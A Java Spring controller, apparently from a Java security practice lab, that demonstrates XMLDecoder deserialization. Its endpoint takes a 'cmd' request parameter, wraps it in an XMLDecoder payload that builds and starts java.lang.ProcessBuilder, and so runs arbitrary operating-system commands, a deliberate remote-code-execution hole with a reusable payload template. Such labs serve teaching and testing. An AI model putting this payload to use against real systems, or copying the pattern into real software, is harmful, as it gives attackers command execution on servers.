package org.bewhale.javasec.controller.deserialize;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;

@Controller
@RequestMapping("/home/deserialize")
public class XMLDecoder {
    @RequestMapping("/xmldecoder")
    public String xmlDecoder(String cmd, Model model) {
        StringBuilder results = new StringBuilder();
        String[] strCmd = cmd.split(" ");
        StringBuilder sb = new StringBuilder().append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
                .append("<java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\">")
                .append("    <object class=\"java.lang.ProcessBuilder\">\n")
                .append("        <array class=\"java.lang.String\" length=\"" + strCmd.length + "\">");
        for (int i = 0; i < strCmd.length; i++) {
            sb.append("            <void index=\"" + i + "\">")
                    .append("                <string>" + strCmd[i] + "</string>")
                    .append("            </void>");
        }
        sb.append("        </array>")
                .append("        <void method=\"start\" />")
                .append("    </object>")
                .append("</java>");
        String xml = sb.toString();
        try {
            java.beans.XMLDecoder xmlDecoder = new java.beans.XMLDecoder(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
            xmlDecoder.readObject();
            xmlDecoder.close();
            model.addAttribute("results", results.append("执行成功!").append(System.lineSeparator()).append("XML：").append(System.lineSeparator()).append(sb));
        } catch (Exception e) {
            e.printStackTrace();
            model.addAttribute("results", results.append(e));
        }
        return "/deserialize/xmldecoder";
    }
}
